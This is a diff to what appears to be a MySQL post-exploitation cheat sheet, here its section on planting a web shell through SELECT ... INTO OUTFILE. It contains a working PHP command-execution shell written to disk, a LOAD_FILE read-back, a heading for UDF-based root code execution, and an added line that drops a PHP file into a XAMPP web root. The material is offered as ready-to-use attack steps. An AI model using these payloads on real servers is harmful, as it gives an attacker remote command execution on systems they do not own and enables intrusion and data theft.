@@ -62,6 +62,7 @@ SELECT * FROM information_schema.processlist WHERE user != 'system user';
 =========== OUTFILE Webshell (Ən sürətli) ===========
 -- Create UDF dir (if writable)
 SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/tmp/test.php';
+SELECT "<?=$_GET?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo3.php';
 SELECT LOAD_FILE('/tmp/test.php');
 
 -- Linux UDF RCE (mysql root)
